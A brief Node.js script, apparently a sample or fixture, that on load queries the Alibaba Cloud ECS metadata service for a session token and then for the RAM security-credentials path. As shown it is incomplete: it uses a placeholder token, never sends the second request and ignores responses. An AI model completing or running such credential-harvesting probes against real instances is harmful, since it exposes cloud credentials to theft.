const http = require('http');
const META = 'http://100.100.100.200';

function probe() {
  const tokenRequest = http.request(new URL(META + '/latest/api/token'), {
    method: 'PUT',
    headers: {
      'X-aliyun-ecs-metadata-token-ttl-seconds': '300',
    },
  });
  const headers = { 'X-aliyun-ecs-metadata-token': 'token' };
  http.request(new URL(META + '/latest/meta-data/ram/security-credentials/'), {
    method: 'GET',
    headers,
  });
  tokenRequest.end();
}

probe();
